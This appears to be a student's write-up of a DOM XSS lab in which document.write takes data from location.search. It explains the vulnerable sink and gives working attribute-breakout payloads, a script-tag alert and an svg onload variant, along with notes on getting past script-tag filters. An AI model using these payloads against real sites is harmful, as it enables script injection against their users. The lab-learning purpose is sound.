# LAB 3 :

This lab has a DOM XSS in the seach query functionality and it seems to use `document.write` function which writes data out on the page . Here the `document.write` fuction is called with data from `location.search`

What is **`location.search`** ?

```
https://example.com/page?name=anup&age=21
```

```
console.log(location.search);
```

```
?name=anup&age=21
```

If a website takes `location.search` and directly writes it into the page using something like:

```
document.write(location.search);
```

then an attacker could inject:

```
https://example.com/page?<script>alert(1)</script>
```

And the script would execute → Causing XSS 

**Recap [ DOM XSS ] :**

Occurs when a vulnerability exists in the client-side JavaScript, where user-controlled data (like `location.search`, `location.hash`, or `document.URL`) is written into the page without proper sanitization.

**Cause :** The application reads user-controlled data from the URL and inserts it into the webpage using document.write() without validating or escaping it, allowing attackers to inject malicious scripts.

**Solution :**

![L3-1](Images/L3-1.png)

![L3-2](Images/L3-2.png)

This has been seen in the inspect tab and now know that our search str is being placed in a `img src` attr 

![L3-3](Images/L3-3.png)

Solve the lab using this script / payload  :

```
"><script>alert(1)</script>
```

alt :

```
"><svg onload=alert(1)>
```

**Why alt is better ?** 

Sometimes:

- `<script>` tags are filtered or blocked.
- Certain contexts don’t allow `<script>` to execute.
- Event handlers (`onload`, `onerror`) bypass weak filters.

So **`<svg onload=alert(1)>`** is often considered a more flexible or bypass-style payload**.**

---

---
